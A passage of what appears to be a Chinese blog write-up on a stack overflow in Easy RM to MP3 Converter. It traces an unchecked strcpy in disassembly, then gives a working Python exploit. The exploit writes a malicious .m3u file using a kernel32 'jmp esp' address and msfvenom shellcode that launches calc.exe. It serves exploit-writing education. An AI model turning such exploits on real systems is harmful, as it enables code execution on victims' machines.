+<p>接着分析目的字符串 a1，a1 为 Playlist_FindNextItem() 函数调用时传入的参数，根据函数调用栈可回溯到其调用位置在 RM2MP3Converter.exe 模块的 sub_41E2B0 函数中，可以看到是一个函数指针调用，其传入的参数为栈中的地址 [esp+8928h+Str]。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">.text:<span class="number">0041E3</span>D8                 mov     ecx, <span class="number">880</span>h</div><div class="line">.text:<span class="number">0041E3</span>DD                 xor     eax, eax</div><div class="line">.text:<span class="number">0041E3</span>DF                 lea     edi, [esp+<span class="number">8928</span>h+var_2200]</div><div class="line">.text:<span class="number">0041E3</span>E6                 rep stosd</div><div class="line">.text:<span class="number">0041E3</span>E8 ; <span class="number">82</span>:   <span class="keyword">while</span> ( (*(<span class="keyword">int</span> (__cdecl **)(<span class="keyword">char</span> *))(v2 + <span class="number">25714</span>))(&amp;Str) )</div><div class="line">.text:<span class="number">0041E3</span>E8                 lea     ecx, [esp+<span class="number">8928</span>h+Str]</div><div class="line">.text:<span class="number">0041E3</span>EF                 push    ecx</div><div class="line">.text:<span class="number">0041E3</span>F0                 call    dword ptr [ebx+<span class="number">6472</span>h]   <span class="comment">// call MSRMfilter03!Playlist_FindNextItem()</span></div><div class="line">.text:<span class="number">0041E3</span>F6                 add     esp, <span class="number">4</span></div><div class="line">.text:<span class="number">0041E3</span>F9                 test    eax, eax</div><div class="line">.text:<span class="number">0041E3</span>FB                 jz      loc_41E9D2</div></pre></td></tr></table></figure></p>
+<p>切换到伪代码界面，看到参数 Str 与 ebp 的偏移量为 0x6600 = 18(路径字符串长度) + 26094。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> v46; <span class="comment">// [esp+18h] [ebp-8910h]</span></div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> v47; <span class="comment">// [esp+1Ch] [ebp-890Ch]</span></div><div class="line"> <span class="keyword">char</span> ArgList; <span class="comment">// [esp+20h] [ebp-8908h]</span></div><div class="line"> <span class="keyword">char</span> v49; <span class="comment">// [esp+2224h] [ebp-6704h]</span></div><div class="line"> <span class="keyword">char</span> Str; <span class="comment">// [esp+2328h] [ebp-6600h]</span></div><div class="line"> <span class="keyword">char</span> v51; <span class="comment">// [esp+232Bh] [ebp-65FDh]</span></div><div class="line"> <span class="keyword">char</span> v52[<span class="number">8704</span>]; <span class="comment">// [esp+4528h] [ebp-4400h]</span></div><div class="line"> <span class="keyword">char</span> v53; <span class="comment">// [esp+6728h] [ebp-2200h]</span></div></pre></td></tr></table></figure></p>
+<p>至此，已分析完漏洞成因，程序中处理文件中读取的数据时，未对输入数据长度进行检查的情况下，使用 strcpy 将其复制到栈中，从而可能导致栈溢出漏洞。</p>
+<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>在关闭 DEP 的情况下，可以把 shellcode 写入栈中，通过溢出覆盖返回地址为 <code>jmp esp</code> 指令的地址，跳转到栈中执行 shellcode。由于系统 DLL 加载时的内存基址相对固定，且在系统重启之前都不会改变，所以使用系统 DLL 中的跳板指令可较稳定地利用漏洞。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !py mona jmp -r esp -m kernel32</div><div class="line">Hold on...</div><div class="line">                             ...</div><div class="line">[+] Writing results to C:\mona_files\RM2MP3Converter_2572\jmp.txt</div><div class="line">    - Number of pointers of type <span class="string">'jmp esp'</span> : <span class="number">1</span> </div><div class="line">    - Number of pointers of type <span class="string">'call esp'</span> : <span class="number">2</span> </div><div class="line">[+] Results : </div><div class="line"><span class="number">0x75ee3165</span> |   <span class="number">0x75ee3165</span> (b+<span class="number">0x00093165</span>)  : jmp esp |  &#123;PAGE_EXECUTE_READ&#125; [kernel32.dll] ASLR: <span class="keyword">True</span>, Rebase: <span class="keyword">False</span>, SafeSEH: <span class="keyword">True</span>, OS: <span class="keyword">True</span>, v6<span class="number">.1</span><span class="number">.7601</span><span class="number">.17617</span> (C:\Windows\syswow64\kernel32.dll)</div><div class="line"><span class="number">0x75e80233</span> |   <span class="number">0x75e80233</span> (b+<span class="number">0x00030233</span>)  : call esp |  &#123;PAGE_EXECUTE_READ&#125; [kernel32.dll] ASLR: <span class="keyword">True</span>, Rebase: <span class="keyword">False</span>, SafeSEH: <span class="keyword">True</span>, OS: <span class="keyword">True</span>, v6<span class="number">.1</span><span class="number">.7601</span><span class="number">.17617</span> (C:\Windows\syswow64\kernel32.dll)</div><div class="line"><span class="number">0x75f02e2b</span> |   <span class="number">0x75f02e2b</span> (b+<span class="number">0x000b2e2b</span>)  : call esp |  &#123;PAGE_EXECUTE_READ&#125; [kernel32.dll] ASLR: <span class="keyword">True</span>, Rebase: <span class="keyword">False</span>, SafeSEH: <span class="keyword">True</span>, OS: <span class="keyword">True</span>, v6<span class="number">.1</span><span class="number">.7601</span><span class="number">.17617</span> (C:\Windows\syswow64\kernel32.dll)</div><div class="line">    Found a total of <span class="number">3</span> pointers</div></pre></td></tr></table></figure></p>
+<p>这里使用结果中的第一项 0x75ee3165 进行利用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">offset = <span class="number">26094</span></div><div class="line">ret_addr = <span class="number">0x75ee3165</span>   <span class="comment"># address of "jmp esp"</span></div><div class="line"></div><div class="line"><span class="comment"># msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -b '\x00\x0a' -f python -v shellcode</span></div><div class="line">shellcode =  <span class="string">"\x90"</span>*<span class="number">30</span></div><div class="line">shellcode += <span class="string">"\xda\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9\xbb\x29\xe7"</span></div><div class="line">shellcode += <span class="string">"\xb6\xd8\xb1\x31\x31\x5a\x18\x03\x5a\x18\x83\xc2"</span></div><div class="line">shellcode += <span class="string">"\x2d\x05\x43\x24\xc5\x4b\xac\xd5\x15\x2c\x24\x30"</span></div><div class="line">shellcode += <span class="string">"\x24\x6c\x52\x30\x16\x5c\x10\x14\x9a\x17\x74\x8d"</span></div><div class="line">shellcode += <span class="string">"\x29\x55\x51\xa2\x9a\xd0\x87\x8d\x1b\x48\xfb\x8c"</span></div><div class="line">shellcode += <span class="string">"\x9f\x93\x28\x6f\x9e\x5b\x3d\x6e\xe7\x86\xcc\x22"</span></div><div class="line">shellcode += <span class="string">"\xb0\xcd\x63\xd3\xb5\x98\xbf\x58\x85\x0d\xb8\xbd"</span></div><div class="line">shellcode += <span class="string">"\x5d\x2f\xe9\x13\xd6\x76\x29\x95\x3b\x03\x60\x8d"</span></div><div class="line">shellcode += <span class="string">"\x58\x2e\x3a\x26\xaa\xc4\xbd\xee\xe3\x25\x11\xcf"</span></div><div class="line">shellcode += <span class="string">"\xcc\xd7\x6b\x17\xea\x07\x1e\x61\x09\xb5\x19\xb6"</span></div><div class="line">shellcode += <span class="string">"\x70\x61\xaf\x2d\xd2\xe2\x17\x8a\xe3\x27\xc1\x59"</span></div><div class="line">shellcode += <span class="string">"\xef\x8c\x85\x06\xf3\x13\x49\x3d\x0f\x9f\x6c\x92"</span></div><div class="line">shellcode += <span class="string">"\x86\xdb\x4a\x36\xc3\xb8\xf3\x6f\xa9\x6f\x0b\x6f"</span></div><div class="line">shellcode += <span class="string">"\x12\xcf\xa9\xfb\xbe\x04\xc0\xa1\xd4\xdb\x56\xdc"</span></div><div class="line">shellcode += <span class="string">"\x9a\xdc\x68\xdf\x8a\xb4\x59\x54\x45\xc2\x65\xbf"</span></div><div class="line">shellcode += <span class="string">"\x22\x3c\x2c\xe2\x02\xd5\xe9\x76\x17\xb8\x09\xad"</span></div><div class="line">shellcode += <span class="string">"\x5b\xc5\x89\x44\x23\x32\x91\x2c\x26\x7e\x15\xdc"</span></div><div class="line">shellcode += <span class="string">"\x5a\xef\xf0\xe2\xc9\x10\xd1\x80\x8c\x82\xb9\x68"</span></div><div class="line">shellcode += <span class="string">"\x2b\x23\x5b\x75"</span></div><div class="line"></div><div class="line">payload = <span class="string">"A"</span>*offset + struct.pack(<span class="string">"&lt;I"</span>,ret_addr) + <span class="string">"B"</span>*<span class="number">4</span> + shellcode</div><div class="line"></div><div class="line">f = open(<span class="string">"crash.m3u"</span>,<span class="string">"w"</span>)</div><div class="line">f.write(payload)</div></pre></td></tr></table></figure></p>
+<p>以上 exp 中有 2 点需要注意的。</p>
+<ol>
+<li><p>由于是跳转到栈顶 esp 中执行 shellcode，eip 与 esp 的位置是紧挨着的，shellcode 执行过程中如果需要修改栈中数据将有可能把 shellcode 指令部分修改，因此要在 shellcode 前面预留一段内存作为栈空间，这里填充了 30 个 0x90。</p>
+</li>
+<li><p>由于 sub_41E2B0 函数在返回时使用 <code>retn 4</code> 清栈。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.text:<span class="number">0041E9</span>D9                 mov     eax, <span class="number">1</span></div><div class="line">.text:<span class="number">0041E9</span>DE                 pop     esi</div><div class="line">.text:<span class="number">0041E9</span>DF                 pop     ebp</div><div class="line">.text:<span class="number">0041E9</span>E0 ; <span class="number">208</span>:   dword_47BEA8 = <span class="number">1</span>;</div><div class="line">.text:<span class="number">0041E9</span>E0                 mov     dword_47BEA8, eax</div><div class="line">.text:<span class="number">0041E9</span>E5                 pop     ebx</div><div class="line">.text:<span class="number">0041E9</span>E6                 add     esp, <span class="number">8918</span>h</div><div class="line">.text:<span class="number">0041E9</span>EC                 retn    <span class="number">4</span></div><div class="line">.text:<span class="number">0041E9</span>EC sub_41E2B0      endp</div></pre></td></tr></table></figure>
+<p><code>retn 4</code> 具体操作如下，因此需要在 shellcode 前填充 4 个字节，才能通过 <code>jmp esp</code> 跳转到 shellcode 中执行。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pop eip</div><div class="line">跳转到 eip</div><div class="line">add esp, <span class="number">4</span></div></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<p>References:<br>[1] <a href="https://r00tk1ts.github.io/2018/06/24/A%20Tale%20of%20Exploit%20Easy%20RM%202%20MP3%20Converter/" target="_blank" rel="external">A Tale of Exploit “Easy RM 2 MP3</a><br>[2] <a href="https://larry.ngrep.me/2018/08/04/learn-corelan-exploit-writing-part-one/" target="_blank" rel="external">Learn Corelan Exploit Writing Part 1</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/stack-overflow/" rel="tag"># stack overflow</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/1013/stack-overflow-smash-utilization/" rel="next" title="栈溢出 Stack smash 利用">
+                <i class="fa fa-chevron-left"></i> 栈溢出 Stack smash 利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/0803/idapyhon-script-batch-analysis-program/" rel="prev" title="IDAPyhon 脚本批量分析程序">
+                IDAPyhon 脚本批量分析程序 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/binary.jpg"
+               alt="0x4C43" />
+          <p class="site-author-name" itemprop="name">0x4C43</p>
+           
+              <p class="site-description motion-element" itemprop="description">Binary Exploitation</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/0x4C43" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank" rel="external nofollow">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-漏洞信息"><span class="nav-text">0x01 漏洞信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-漏洞分析"><span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-漏洞复现"><span class="nav-text">1. 漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-漏洞定位"><span class="nav-text">2. 漏洞定位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-漏洞成因"><span class="nav-text">3. 漏洞成因</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-漏洞利用"><span class="nav-text">0x03 漏洞利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0x4C43</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://0x4c43s-blog.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://0x4c43.cn/2018/0814/easyrm2mp3-stack-overflow-analysis/';
+          this.page.identifier = '2018/0814/easyrm2mp3-stack-overflow-analysis/';
+          this.page.title = 'EasyRM2MP3 栈溢出分析';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://0x4c43s-blog.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "c190dfc84c3444f78b4a39fbfe45d4ee",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
